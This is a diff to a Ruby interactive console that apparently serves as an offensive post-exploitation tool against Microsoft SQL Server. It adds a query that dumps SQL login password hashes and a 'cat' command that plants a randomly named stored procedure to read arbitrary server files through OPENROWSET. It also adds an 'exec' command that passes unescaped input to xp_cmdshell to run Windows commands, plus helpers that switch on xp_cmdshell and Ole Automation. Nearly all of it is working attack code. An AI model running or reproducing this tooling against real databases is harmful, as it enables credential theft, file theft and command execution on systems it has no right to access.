@@ -53,11 +53,9 @@ class Commands
     records
   rescue Sequel::DatabaseError => e 
     puts "[!] ".yellow + e.message 
-    binding.pry if @debug =~ /true/i
   rescue Exception => e
     puts "[!] ".yellow + "Unhandled exception"
     puts e.full_message
-    binding.pry if @debug =~ /true/i
   end
 
   def cmd_query_link(var=nil)
@@ -126,7 +124,8 @@ on      perm.grantee_principal_id = princ.principal_id
 
   def cmd_logons(var=nil)
     puts "[+] ".green.bold + "List of loggedin users"
-    cmd_query("SELECT principal_id AS id,name FROM sys.server_principals")
+    # cmd_query("SELECT principal_id AS id,name FROM sys.server_principals")
+    cmd_query("SELECT sp.name AS login, sp.type_desc AS login_type, CONVERT([varchar](512), sl.password_hash, 1) AS password_hash, CASE WHEN sp.is_disabled = 1 then 'Disabled' else 'Enabled' end AS status FROM sys.server_principals sp left JOIN sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') ORDER BY sp.name;")
   end
 
   def cmd_db_admins(var=nil)
@@ -167,7 +166,7 @@ on      perm.grantee_principal_id = princ.principal_id
 
   def cmd_enable_xpcmdshell(var=nil)
     puts "[+] ".green + "Current configurations:"
-    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
     puts "[+] ".green + "Enabling xp_cmdshell"
     cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;')")
     puts "[+] ".green + "Modified configurations:"
@@ -176,11 +175,21 @@ on      perm.grantee_principal_id = princ.principal_id
 
   def cmd_disable_xpcmdshell(var=nil)
     puts "[+] ".green + "Current configurations:"
-    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
     puts "[+] ".green + "Enabling xp_cmdshell"
     cmd_query("EXEC('sp_configure ''xp_cmdshell'', 0; reconfigure;');EXEC('sp_configure ''show advanced options'', 0; reconfigure;')")
     puts "[+] ".green + "Modified configurations:"
-    cmd_query('SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = "xp_cmdshell" OR name = "show advanced options";')
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'xp_cmdshell' OR name = 'show advanced options';")
+  end
+
+  def enable_ole_authomation
+    _print = @verbose =~ /true/i? true : false
+    puts "[+] ".green + "Current configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'") if _print
+    puts "[+] ".green + "Enabling Ole Automation Procedures"
+    cmd_query("EXEC('sp_configure ''show advanced options'', 1; reconfigure;');EXEC('sp_configure ''Ole Automation Procedures'', 1; reconfigure;')", _print)
+    puts "[+] ".green + "Modified configurations:" if _print
+    cmd_query("SELECT name,value,value_in_use,description,is_dynamic,is_advanced FROM sys.configurations WHERE name = 'Ole Automation Procedures'") if _print
   end
 
 
@@ -207,6 +216,42 @@ on      perm.grantee_principal_id = princ.principal_id
     cmd_query("SELECT table_catalog AS [Database],table_name AS table_name, column_name AS column_name FROM INFORMATION_SCHEMA.COLUMNS #{t_query}")
   end
 
+  def cmd_sessions(val=nil)
+    puts "[+] ".green + "List of sessions:"
+    cmd_query("SELECT conn.session_id, host_name, status, program_name, nt_domain, login_name, connect_time, last_request_end_time FROM sys.dm_exec_sessions AS sess JOIN sys.dm_exec_connections AS conn ON sess.session_id = conn.session_id;")
+  end
+
+  # 
+  # Resources
+  # - https://www.mssqltips.com/sqlservertip/1643/using-openrowset-to-read-large-files-into-sql-server/
+  # 
+  def cmd_cat(file_path)
+    if file_path.nil? || file_path.empty?
+      puts "[!] ".yellow + "File name missing (full path required)"
+      return 
+    end    
+    file = parse_path(file_path)
+
+    stored = create_readfile_procedure
+    query = <<~SQLQUERY
+      DECLARE @t VARCHAR(MAX) 
+      EXEC #{stored[:procedure]} '#{file[:full_path]}', @t output 
+      SELECT @t AS [BulkColumn] 
+    SQLQUERY
+    puts "[+] ".green.bold + "Reading file '#{file_path}' content:"
+    bulkcontent = cmd_query(query, false).first[:bulkcolumn]
+    puts "[+] ".green + "Cleaning-up created stored procedure '#{stored[:procedure]}' content"
+    cmd_query("DROP PROCEDURE IF EXISTS #{stored[:procedure]}", false) # check if dropped: query IF OBJECT_ID('PROCEDURENAME', 'P') IS NULL SELECT @@servername
+    puts bulkcontent.to_s
+  end
+
+  def cmd_exec(cmd)
+    if cmd.nil? || cmd.empty?
+      puts "[!] ".yellow + "No command was provided"
+      return 
+    end
+    cmd_query("EXEC xp_cmdshell '#{cmd}'")
+  end
 
   # TBD : https://github.com/NetSPI/Powershell-Modules/blob/master/Get-MSSQLAllCredentials.psm1
   def cmd_get_allcredentials(val=nil)
@@ -230,7 +275,7 @@ on      perm.grantee_principal_id = princ.principal_id
       return 
     end
     val =~ /true/i? (@debug = 'true') : (@debug = 'false')
-    puts "[*] Setting debugging to: #{@debug}"
+    puts "[*] " + "Setting debugging to: #{@debug}"
   end
 
   def cmd_exit(cmd=nil)
@@ -248,11 +293,13 @@ on      perm.grantee_principal_id = princ.principal_id
     puts "whoami".ljust(20," ")               + "whoami - retrieve current user informaiton."
     puts "db-admins".ljust(20," ")            + "db-admins - retrieve sysadmins."
     puts "logons".ljust(20," ")               + "logons - retrieve logged-on users."
+    puts "sessions".ljust(20," ")             + "sessions - retrieve sessions (includes usernames and hostnames)."
     puts "enum-domain-groups".ljust(20," ")   + "enum-domain-groups [DOMAIN]- retrieve domain groups."
     puts "dbs".ljust(20," ")                  + "dbs - list databases."
     puts "tables".ljust(20," ")               + "tables <DB_Name> - list tables for database."
     puts "columns".ljust(20," ")              + "columns <Table_Name> - list columns from table."
     puts "exec".ljust(20," ")                 + "exec <CMD> - Execute Windows commands using xp_cmdshell."
+    puts "cat".ljust(20," ")                  + "cat <FILE> - Read file from disk. (full path must given)"
     puts "enable-xpcmdshell".ljust(20," ")    + "enable-xpcmdshell - enable xp_cmdshell on MSSQL."
     puts "disable-xpcmdshell".ljust(20," ")   + "disable-xpcmdshell - disable xp_cmdshell on MSSQL."
     puts "links".ljust(20," ")                + "links - crawl MSSQL links."
@@ -261,6 +308,59 @@ on      perm.grantee_principal_id = princ.principal_id
     puts "help".ljust(20," ")                 + "Show this screen"
     puts "exit".ljust(20," ")                 + "exit the console"
     puts "\n"
+  end
+
+  
+  def create_readfile_procedure
+    stored_proc = "ns_txt_file_read"
+    stored_proc = "read_txt_sp_#{('a1'..'z9').to_a.sample(5).join}"
+    puts "[*] ".green + "Creating stored procedure '#{stored_proc}'."
+    query = <<~RAWSQL
+    CREATE PROC [dbo].[#{stored_proc}]  
+      @os_file_name NVARCHAR(256) 
+      ,@text_file VARCHAR(MAX) OUTPUT  
+    AS  
+    DECLARE @sql NVARCHAR(MAX) 
+            , @parmsdeclare NVARCHAR(4000)
+
+    SET NOCOUNT ON
+    SET @sql = 'select @text_file=(select * from openrowset ( 
+                bulk ''' + @os_file_name + ''' 
+                ,SINGLE_CLOB) x 
+                )' 
+    SET @parmsdeclare = '@text_file varchar(max) OUTPUT' 
+    EXEC sp_executesql @stmt = @sql 
+                              , @params = @parmsdeclare 
+                              , @text_file = @text_file OUTPUT 
+    RAWSQL
+    query = cmd_query(query, false)
+    {procedure: stored_proc, sp_query: query}
+  end
+
+  def parse_path(path)
+    if path.nil?
+      puts "[!] ".yellow + "Path can't be empty"
+      return 
+    end
+    path_ary = path.split(/[\\]/)
+    name = path_ary[-1]
+    path = path_ary[0...-1].join('\\')
+    full = path_ary.join('\\')
+    {path: path, name: name, full_path: full}
+  end
+
+  # debugging for developement only
+  def cmd_pry(val=nil)
+    # Pry.config.prompt_name = "SQL(pry)> "
+    # binding.pry
+    Pry.start(
+      binding,
+      :prompt => Pry::Prompt.new(
+        "custom",
+        "my custom prompt",
+        [ proc { "SQL(pry)> " }, proc { "MORE INPUT REQUIRED!*" }]
+      )
+    )
   end
 
   def run_command(cmd="")
@@ -279,8 +379,6 @@ on      perm.grantee_principal_id = princ.principal_id
   rescue Exception => e
     puts "[x] ".red + "Unhandled exception!"
     puts e.full_message
-    Pry.config.prompt_name = "SQL(pry)> "
-    binding.pry if @debug =~ /true/i
   end
 end
 
@@ -336,9 +434,9 @@ begin
   puts @commands.run_command('help')
 
   MAIN = %w[
-    help info dbs tables columns query links query-link exec
+    help info dbs tables columns query links query-link exec cat
     get-xpcmdshell, enable-xpcmdshell disable-xpcmdshell whoami
-    logons db-admins enum-users enum-domain-groups
+    logons sessions db-admins enum-users enum-domain-groups
     verbose debug 
     exit
   ].sort
